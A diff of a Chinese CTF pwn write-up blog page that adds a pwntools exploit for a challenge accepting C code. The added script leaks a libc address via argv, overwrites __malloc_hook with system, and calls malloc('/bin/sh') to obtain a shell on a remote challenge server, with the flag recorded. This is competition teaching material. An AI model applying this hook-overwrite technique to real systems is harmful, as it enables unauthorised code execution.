@@ -95,7 +95,7 @@
 <meta property="og:image" content="http://example.com/2021/10/14/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9Bpwn-wp/image-20211014111326635.png">
 <meta property="og:image" content="http://example.com/2021/10/14/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9Bpwn-wp/image-20211014112209454.png">
 <meta property="article:published_time" content="2021-10-14T02:22:05.000Z">
-<meta property="article:modified_time" content="2021-10-14T03:43:27.200Z">
+<meta property="article:modified_time" content="2021-10-19T11:29:12.920Z">
 <meta property="article:author" content="R1nd0">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
@@ -394,11 +394,14 @@
 <img src="/2021/10/14/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9Bpwn-wp/image-20211014105318591.png" class="">
 
 <p>感觉这个printf能用的话就很舒服了，计算某些量的时候可以直接log大法输出出来看看对不对</p>
-<p>那大概知道了怎么玩之，解题思路就很清晰了：在有限的语句下getshell</p>
+<p>那大概知道了怎么玩之后，解题思路就很清晰了：在有限的语句下getshell</p>
 <p>可以模仿一波轩哥的办法：</p>
 <p>第一步，泄露地址，可以通过环境变量索引的方式拿到栈上的某个<code>libc</code>地址</p>
 <p>第二步，计算出<code>system</code>和<code>malloc_hook</code></p>
 <p>第三步，改<code>malloc_hook</code>为<code>system</code>，<code>malloc(&quot;/bin/sh&quot;)</code>即可</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	pause()</span><br><span class="line">p = remote(<span class="string">&#x27;119.3.145.161&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">payload= <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">int main(int argc,char ** argv)&#123;</span></span><br><span class="line"><span class="string">    int addr,libc,system,malloc_hook;</span></span><br><span class="line"><span class="string">    libc = argv[-28] - 231 - 0x21b10;</span></span><br><span class="line"><span class="string">    printf(&quot;addr: %p&quot;,libc);</span></span><br><span class="line"><span class="string">    system = libc + 0x4f550;</span></span><br><span class="line"><span class="string">    malloc_hook = libc + 0x3ebc30;</span></span><br><span class="line"><span class="string">    * (int *)malloc_hook = system;</span></span><br><span class="line"><span class="string">    malloc(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;ebe275d346e3af315bcdc78aed613e2c&#125;</span></span><br></pre></td></tr></table></figure>
+
 <p>当然，本题的做法其实可以有很多，因为可操作性还是挺大的</p>
 <p>总结起来就是，本题可以直接运行代码并具有内存读写的能力，关键就是要在受到限制的情况下通过内存读写来完成shell的获取</p>
 <h1 id="T-S"><a href="#T-S" class="headerlink" title="T_S"></a>T_S</h1><p>本题中，花指令把最关键的部分藏起来了，所以要先去除一波</p>
